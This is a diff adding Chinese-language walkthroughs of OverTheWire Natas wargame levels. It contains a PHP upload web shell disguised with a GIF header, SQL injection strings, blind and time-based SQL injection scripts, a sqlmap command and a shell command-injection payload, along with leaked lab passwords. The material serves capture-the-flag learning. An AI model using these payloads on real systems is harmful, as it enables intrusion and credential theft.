@@ -334,7 +334,428 @@ if($data["showpassword"] == "yes") {
 ?>
 ```
 
+cookie上的data("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw")经过加密，
+
+```
+<?php
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+$data= 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw';
+function xor_encrypt($in,$out) {
+    $key ='' ;
+    $text = $in;
+    for($i=0;$i<strlen($text);$i++) {
+    $key .= $text[$i] ^ $out[$i];
+    }
+    return $key;
+}
+ echo xor_encrypt(json_encode($defaultdata),base64_decode($data)); 
+?>
+//得到key: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+<?php
+$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+ 
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+    return $outText;
+}
+//得到新data: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
 ## 13.
 
+source code
+```
+<? 
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+
+通过抓包可以分析出来服务端是以filename字段的后缀名来存储文件的，那么我们直接修改后缀为.php，即可成功上传文件，访问之即可获得natas13密码
+
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+## 14. php.exif_imagetype
+
+source code
+```
+...
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+
+测试上传发现过滤，exif_imagetype()函数，用于检验文件是否是图片，读取一个图像的第一个字节并检查其签名，只要在php文件最前面加上图片信息签名即可绕过。
+
+```
+GIF89a
+ 
+<?php
+system('cat /etc/natas_webpass/natas14');
+?>
+```
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+## 15.
+
+```
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysql_close($link);
+} else {
+?>
+```
+
+可以看到此处直接将输入参数username和password值拼接进SQL语句执行，那么肯定存在SQL注入了
+username填入admin" or 1=1#，password填入1(随便都可以)
+获得natas15密码
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+## 16. sqlmap自动化注入
+
+```
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
+
+```python
+# -*- coding: UTF-8 -*-
+import requests
+
+url='http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
+
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+filtered = ''
+
+passwd = ''
+
+for char in chars:
+    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    #使用like模糊查询不会区分大小写，要带上binary
+    r = requests.post(url=url,data=Data)
+    if 'exists' in r.text :
+        filtered = filtered + char
+        print filtered #先过滤出密码里存在的字符，然后再跑具体的值，这样能加快速度
+
+for i in range(0,32):
+    for char in filtered:
+        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
+        #使用like模糊查询不会区分大小写，要带上binary
+        r = requests.post(url=url,data=Data)
+        if 'exists' in r.text :
+            passwd = passwd + char
+            print(passwd)
+            break
+
+```
+
+或
+```python
+python sqlmap.py -u "http://natas15.natas.labs.overthewire.org/index.php" --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  --dbms=mysql --data username=natas16 --level=5 --risk=3 --technique=B --dump --string="This user exists"
+```
+
+考查SQL注入漏洞，但这次需要盲注处密码的值，需要写盲注脚本，虽然sql语句中只查询了username字段来判断用户是否存在，这里我们直接猜测用户natas16是存在的，再使用and逻辑运算将对password字段的查询连接起来，构成布尔注入语句，使用like模糊查询，最终得到密码
+
+> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+## 17.
+
+```
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+```
+$(grep a /etc/natas_webpass/natas17)Africans
+如果密码文件里首字母是`a`外层就是aAfricans，输出結果dictionary.txt就会找不到
+如果密码文件里首字母不是`a`外层就是Africans，输出結果就是dictionary.txt找到Africans
+```
+
+我们知道dictionary.txt中存在的字符串，比如说Africans，用它与$(grep)的返回值相加，如果内层返回了结果将检索出空值，如果返回空值则外层的grep会返回结果，比如：
+password中首字母为a，构造出语句
+grep -I "$(grep a /etc/natas_webpass/natas17)Africans" dictionary.txt
+由于内部的$()命令返回了a，则使外层命令变为
+grep -I "aAfricans" dictionary.txt
+由于dictionary中没有aAfricans，从而返回空值
+而如果内层$()命令返回空值，外层则能正确检索到Africans，于是返回值，证明首字母不是a
+在此思路上我们来构造命令盲注脚本
+
+```python
+import requests
+url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/"
+key = ''
+char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+while len(key) < 32:
+    for i in range(len(char)):
+        payload = {'needle':'$(grep ^'+key+char+'.* /etc/natas_webpass/natas17)wrong','submit':'Search'}
+        req = requests.get(url=url,params=payload)
+        if 'wrong' not in req.text:
+            key += char
+    print key
+```
+
+```python
+# -*- coding: UTF-8 -*-
+
+import requests  
+
+from requests.auth import HTTPBasicAuth  
+  
+auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  
+  
+filteredchars = ''  
+
+passwd = ''  
+
+allchars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
+
+for char in allchars:  
+
+ r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ' + char + ' /etc/natas_webpass/natas17)Africans', auth=auth)  
+   
+ if 'Africans' not in r.text:  
+
+  filteredchars = filteredchars + char  
+
+  print(filteredchars)  
+  
+for i in range(32):  
+
+ for char in filteredchars:  
+
+  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)Africans', auth=auth)  
+    
+  if 'Africans' not in r.text:  
+
+   passwd = passwd + char  
+
+   print(passwd)  
+
+   break
+```
+
+> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+## 18.
+
+```
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
+
+这一题依然是考查SQL注入漏洞，不过显然比之前的题目更难了点：因为没有任何回显
+所以这次我需要通过sleep()进行延时盲注
+输入：natas18" and sleep(5) #
+服务端构造的SQL语句：SELECT * from users where username="natas18" and sleep(5) #
+
+```python
+import requests
+[/color] [color=Black]
+url = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php'
+key =''
+ 
+for i in range(1,33):
+    a = 32
+    c = 126
+    while a<c:
+        b = (a+c)/2
+        payload=r'natas18" and if(%d<ascii(mid(password,%d,1)),sleep(2),1) and "" like "'%(b,i)
+        try:
+            req = requests.post(url=url,data={"username":payload},timeout=2)
+        except requests.exceptions.Timeout,e:
+            a=b+1
+            b=(a+c)/2
+            continue
+        c=b
+    key +=chr(b)
+    print key
+```
+
+```python
+import requests 
+ 
+from requests.auth import HTTPBasicAuth  
+  
+Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')  
+headers = {'content-type': 'application/x-www-form-urlencoded'}  
+filteredchars = ''  
+passwd = ''  
+allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
+  
+for char in allchars:  
+        payload = 'username=natas18" and password like binary \'%{0}%\' and sleep(5) #'.format(char)  
+        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
+        if(r.elapsed.seconds >= 1):  
+                filteredchars = filteredchars + char  
+                print(filteredchars)  
+  
+print(filteredchars)  
+  
+for i in range(0,32):  
+        for char in filteredchars:  
+                payload = 'username=natas18" and password like binary \'{0}%\' and sleep(5) #'.format(passwd + char)  
+                r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
+                if(r.elapsed.seconds >= 3):  
+                        passwd = passwd + char  
+                        print(passwd)  
+                        break
+```
+
+## 19.
+## 20. 
 [back](/)
 
